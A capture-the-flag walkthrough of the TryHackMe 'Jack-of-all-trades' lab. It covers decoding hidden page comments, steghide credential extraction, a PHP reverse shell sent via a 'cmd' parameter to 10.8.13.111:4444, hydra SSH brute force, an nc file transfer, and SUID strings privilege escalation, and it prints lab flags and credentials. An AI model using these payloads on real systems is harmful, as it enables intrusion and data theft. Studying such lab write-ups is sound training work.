# [Challenge](https://tryhackme.com/room/jackofalltrades)
# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 jack`)
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# EXPLOITATION
`/index.html`:
```html
<html> <head> <title>Jack-of-all-trades!</title> <link href="[assets/style.css](view-source:http://jack:22/assets/style.css)" rel=stylesheet type=text/css> </head> <body> <img id="header" src="[assets/header.jpg](view-source:http://jack:22/assets/header.jpg)" width=100%> <h1>Welcome to Jack-of-all-trades!</h1> <main> <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p> <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p> <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p> <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p> <img src="[assets/stego.jpg](view-source:http://jack:22/assets/stego.jpg)"> <p>I make a lot of models myself, but I also do toys, like this one:</p> <img src="[assets/jackinthebox.jpg](view-source:http://jack:22/assets/jackinthebox.jpg)"> <!--Note to self - If I ever get locked out I can get back in at /recovery.php! --> <!-- UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== --> <p>I hope you choose to employ me. I love making new friends!</p> <p>Hope to see you soon!</p> <p id="signature">Jack</p> </main> </body> </html>
```
`UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==` -> `Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq`

`/recovery.php`:
```html
<!DOCTYPE html> <html> <head> <title>Recovery Page</title> <style> body{ text-align: center; } </style> </head> <body> <h1>Hello Jack! Did you forget your machine password again?..</h1> <form action="[/recovery.php](view-source:http://jack:22/recovery.php)" method="POST"> <label>Username:</label><br> <input name="user" type="text"><br> <label>Password:</label><br> <input name="pass" type="password"><br> <input type="submit" value="Submit"> </form> <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= --> </body> </html>
```
`GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=` -> `Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F` -> `Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S` that's [the wikipedia page for the "stegosauria"](http://en.wikipedia.org/wiki/Stegosauria) so... steganography!
`steghide --extract -sf header.jpg` -> `cmd.creds`:
```Text
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```
Let's try these credentials in `/recovery.php`
`/recovery.php`: `GET me a 'cmd' and I'll run it for you Future-Jack.`
Mmmhhhh, let's try `cmd` as parameter: `http://jack:22/nnxhweOV/index.php?cmd=whoami` -> `GET me a 'cmd' and I'll run it for you Future-Jack. www-data www-data`
Bingo! Let's open a revshell: `http://jack:22/nnxhweOV/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.13.111%22%2C4444%29%3Bexec%28%22bash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27` and let's generate an interactive shell: `python -c "import pty; pty.spawn('/bin/bash')"`
# PRIVILEGE ESCALATION
We can't go into `/home/jack`: we need his credentials first; there's a file called `jacks_password_list`: let's bruteforce it!
`hydra -l jack -P creds.txt ssh://jack:80 -t 60 -V`
`jack:ITMJpGGIqg1jn?>@`
Let's grab the user flag but... it's in jpg! Let's download the image: `nc 10.8.13.111 4444 < user.jpg` -> `nc -lvnp 4444 > user.jpg`
`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`
I ran `linpeas.sh` and... `/usr/bin/strings` has SUID bit check! Let's run it to read `/root/root.txt`: `strings /root/root.txt`
```Text
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
